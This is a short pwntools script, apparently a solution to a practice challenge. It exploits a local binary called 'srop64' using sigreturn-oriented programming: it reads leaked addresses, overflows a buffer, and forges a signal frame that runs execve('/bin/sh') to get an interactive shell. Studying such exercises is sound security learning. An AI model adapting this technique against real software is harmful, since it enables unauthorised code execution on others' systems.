from pwn import *


def leak(p):
    p.recvuntil("func: 0x")
    func = int(p.recvline(), 16)

    p.recvuntil("/bin/sh: 0x")
    binsh = int(p.recvline(), 16)

    log.info("Func 0x%x. /bin/sh 0x%x" % (func, binsh))

    return func, binsh

def main():
    context.arch = 'amd64'
    p = process("./srop64")
    
    func, binsh = leak(p)
    
    moveax = func + 4
    syscall = func + 10

    frame = SigreturnFrame(kernel='amd64') # Construct our Sig Return Frame
    frame.rax = constants.SYS_execve       # Syscall to call
    frame.rdi = binsh                      # First argument to execve 
    frame.rip = syscall                    # Return here after the syscall
    
    payload = 'A' * 12                     # Overflow the buffer
    payload += p64(moveax)                 # Mov 0x77 into eax (SYS_sigreturn)
    payload += p64(syscall)                # Evoke the syscall 
    payload += str(frame)                  # Add our sigreturn frame to the end
    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    main()
